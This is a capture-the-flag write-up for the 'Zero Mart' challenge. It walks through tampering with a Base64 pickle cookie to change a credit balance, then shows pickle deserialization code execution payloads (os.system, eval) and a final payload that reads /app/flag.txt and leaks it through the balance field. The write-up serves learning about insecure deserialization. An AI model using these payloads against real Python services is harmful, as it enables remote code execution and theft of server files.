# Zero Mart

> APOCALYPSE has recently started ZeroMart, which is a service that lets their agents redeem the latest 0-day exploits with their credits. Seems like their members have been accessing their underground service by using a client program that has been given to them. We've managed to get our hands on the client, so can you try and infiltrate their system? The server runs python 3.7

>  Note: flag.txt is located at `/app/flag.txt`. Also you might need to install the python requests library to get the client running.

Here's an abbreviated version of the attached `client.py`:

```python
session = requests.Session()
r = session.get(ENDPOINTS['init'])
balance = r.json()['balance']
shop = r.json()['shop']
while True:
    menu()
    choice = input('Choice: ')
    r = session.post(ENDPOINTS['buy'], json={'item': choice})
    print(f"[+] {r.json()['message']}")
    if 'balance' in r.json().keys():
        balance = r.json()['balance']
    input('Press Enter to continue...')
```

Initially, the balance starts off at 1 credit. A large amount of credits is required to buy other items, but `Chipusuketo` can be bought with just 1 credit.

```
HaatoBurido (31337 Credits)
Pudoru (31337 Credits)
Merutodaun (31337 Credits)
Rouhanma (31337 Credits)
Sherushoku (31337 Credits)
Etanaruburu (31337 Credits)
Chipusuketo (1 Credits)
```

After buying `Chipusuketo`, we observe that the balance decreases to zero and we're no longer allowed to buy anything. So the balance information must be stored somewhere. But where? Sending the request in Postman reveals a cookie `zero_mart_data="gAN9cQBYBwAAAGJhbGFuY2VxAUsBcy4="`. This is clearly Base64 data, but decoding it produces a bunch of unreadable characters.

## Pickles

However, given that the server uses python, we may guess that [python pickles](https://docs.python.org/3/library/pickle.html) have been used to store the data. (This is reinforced by the fact that there is a specific python 3.x version stated, as pickles created with one version may not be decodable by others) Decoding the pickle using `pickle.loads`:

````python
import pickle
import base64

print(pickle.loads(base64.b64decode("gAN9cQBYBwAAAGJhbGFuY2VxAUsBcy4=")))
# => {'balance': 1}
````

Now we know how the data is encoded, we change the balance to whatever we want. For example:

```python
def make_cookie(data):
    c = str(base64.b64encode(data))[2:-1]
    return '"' + c + '"'

pic = pickle.dumps({"balance":696969})

session.cookies.set('zero_mart_data', make_cookie(pic),
                        domain="aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg")
```

This allows us to buy whatever we want, but we still can't get the flag. We will need to think of something more advanced.

## RCE using pickle

Note: See [Exploiting Python pickles - David Hamann](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) for an in-depth explanation

While pickle is frequently used to store python objects in a binary format, deserializing arbitrary pickles is very dangerous and can actually lead to remote code execution. Let's see how this works.

```python
import pickle

class Exploit:
    def __reduce__():
        return print, ("Hello, world",)
    
pic = pickle.dumps(Exploit())
data = pickle.loads(pic)
# => Prints "Hello, world"
print(data)
# => None
```

Python's pickle module allows us to customize what will happen when a pickle is deserialized. This is specified through the `__reduce__` method in a class. When an instance of `Exploit` is pickled, the `__reduce__` function is called. The `__reduce__` function should return a tuple of 2 items, a function and a tuple of arguments. Pickle stores these in the pickle. When `pickle.loads` is called, the function stored in the pickle is called with the arguments specified. Thus, in this case, `print("Hello, world")` is executed. The return value of `pickle.loads` is the return value of the function called, which is `None` in the case of `print`.

One benefit of pickle is that you can store pretty much any function, including Python module functions that are not currently imported. For example,

```python
import os
class Exploit:
    def __reduce__():
        return os.system, ("ls",)
    
pic = pickle.dumps(Exploit())
```

If `pickle.loads(pic)` is executed in another python environment, even without `import os`, the `ls` command would still be run.

## Getting the flag

However, even once we get RCE, it's still not game over yet. If we used the exploit from above, the server returns a `Internal Server Error` instead of listing any files. This is probably because the server does something like

```python
data = pickle.loads(cookie)
balance = data["balance"]
```

Because `os.system("ls")` returns `0`, and `0` is not a dictionary, the process crashes. During the CTF, I tried several different ways of exfiltrating the flag from the server, such as reverse shell and HTTP requests but none were successful :<.

The challenge authors may have decided to make it harder by blocking all network connections out of the service. Anyway, we can still transfer data out through the service itself.

```python
class Exploit:
    def __reduce__():
        return eval, ('{"balance":1+1}',)
    
pic = pickle.dumps(Exploit())
```

In Python (and several other languages), `eval` executes the string it is passed as Python code. In this case, `pickle.loads` returns `{"balance": 2}`. This is displayed to us as the number of credits left after a transaction. Since we can control how `balance` is computed, we can try to use this to encode the flag. But how do we encode a string as an integer? There are many ways of varying complexity, but one of the simplest and most straightforward is to concatenate the binary ASCII values of each character together and parse it as a single integer. Here's some code for doing that:

```python
def bytes_to_int(b):
    return int("".join([bin(x)[2:].zfill(8) for x in b]),2)

def int_to_bytes(inp):
    # Higher order bit of ASCII is zero
    bstr = "0" + bin(inp)[2:]
    chunks = [int(bstr[i:i+8], 2) for i in range(0, len(bstr), 8)]
    return "".join([chr(x) for x in chunks])
```

The final payload:

```python
class Exploit:
    def __reduce__(self):
        return eval, ('{"balance": int("".join([bin(x)[2:].zfill(8) for x in open("/app/flag.txt", "rb").read()]), 2)}',)


pic = pickle.dumps(Exploit())
session.cookies.set('zero_mart_data', make_cookie(pic), domain="aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg")

r = session.post(ENDPOINTS['buy'], json={'item': "Chipusuketo"})
balance = r.json()['balance'] + 1
print(int_to_bytes(balance))
# => Cyberthon{1r0n1c_h0w_z3r0_m4rt_h45_4_z3r0_d4y}
```

While I didn't solve this challenge within the CTF, it's still an interesting challenge that required me to think out of the box.

